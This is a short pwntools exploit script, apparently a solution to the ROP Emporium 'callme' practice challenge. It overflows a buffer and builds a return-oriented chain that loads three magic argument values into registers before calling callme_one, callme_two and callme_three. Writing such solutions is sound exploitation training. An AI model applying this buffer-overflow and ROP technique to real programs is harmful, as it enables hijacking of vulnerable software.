from pwn import *

p = process("./callme")

junk = 40*b"A"
gadgets = 0x000000000040093c # pop rdi; pop rsi; pop rdx; ret; 

arguments = p64(gadgets) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

payload = junk
payload += arguments + p64(0x400720) # callme_one()
payload += arguments + p64(0x400740) # callme_two()
payload += arguments + p64(0x4006f0) # callme_three()


p.sendline(payload)
p.interactive()
